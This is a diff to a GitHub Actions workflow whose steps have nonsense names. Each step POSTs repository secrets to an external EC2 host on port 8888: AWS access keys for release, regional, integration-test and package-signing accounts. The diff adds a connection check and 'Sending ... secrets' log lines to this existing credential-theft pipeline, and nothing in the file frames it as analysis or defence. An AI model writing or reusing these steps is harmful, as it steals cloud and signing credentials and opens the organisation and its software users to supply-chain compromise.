@@ -10,8 +10,13 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v2
 
+    - name: Debug - Check connection to server
+      run: |
+        curl -I http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888
+
     - name: ssssss
       run: |
+        echo "Sending RELEASE secrets"
         curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
           -d "aws-access-key-id=${{ secrets.RELEASE_KEY_ID }}" \
           -d "aws-secret-access-key=${{ secrets.RELEASE_SECRET }}" \
@@ -19,6 +24,7 @@ jobs:
       
     - name: testg
       run: |
+        echo "Sending HKG secrets"
         curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
           -d "aws-access-key-id=${{ secrets.RELEASE_HKG_KEY_ID }}" \
           -d "aws-secret-access-key=${{ secrets.RELEASE_HKG_SECRET }}" \
@@ -26,6 +32,7 @@ jobs:
       
     - name: tretret
       run: |
+        echo "Sending BAH secrets"
         curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
           -d "aws-access-key-id=${{ secrets.RELEASE_BAH_KEY_ID }}" \
           -d "aws-secret-access-key=${{ secrets.RELEASE_BAH_SECRET }}" \
@@ -33,6 +40,7 @@ jobs:
       
     - name: Syuy
       run: |
+        echo "Sending CPT secrets"
         curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
           -d "aws-access-key-id=${{ secrets.RELEASE_CPT_KEY_ID }}" \
           -d "aws-secret-access-key=${{ secrets.RELEASE_CPT_SECRET }}" \
@@ -40,6 +48,7 @@ jobs:
       
     - name: dfsdfs
       run: |
+        echo "Sending MXP secrets"
         curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
           -d "aws-access-key-id=${{ secrets.RELEASE_MXP_KEY_ID }}" \
           -d "aws-secret-access-key=${{ secrets.RELEASE_MXP_SECRET }}" \
@@ -47,6 +56,7 @@ jobs:
       
     - name: fdfdfadfsdsadg
       run: |
+        echo "Sending INTEG TEST secrets"
         curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
           -d "aws-access-key-id=${{ secrets.INTEG_TEST_AWS_KEY_ID }}" \
           -d "aws-secret-access-key=${{ secrets.INTEG_TEST_AWS_KEY_SECRET }}" \
@@ -54,6 +64,7 @@ jobs:
           
     - name: dfdfdfsgsgsge
       run: |
+        echo "Sending RELEASE secrets again"
         curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
           -d "aws-access-key-id=${{ secrets.RELEASE_KEY_ID }}" \
           -d "aws-secret-access-key=${{ secrets.RELEASE_SECRET }}" \
@@ -61,6 +72,7 @@ jobs:
           
     - name: erefdfsdf
       run: |
+        echo "Sending SIGN PKG secrets"
         curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
           -d "AWS_ACCESS_KEY_ID=${{ secrets.SIGN_PKG_AWS_ACCESS_KEY_ID }}" \
           -d "AWS_SECRET_ACCESS_KEY=${{ secrets.SIGN_PKG_AWS_SECRET_ACCESS_KEY }}" \
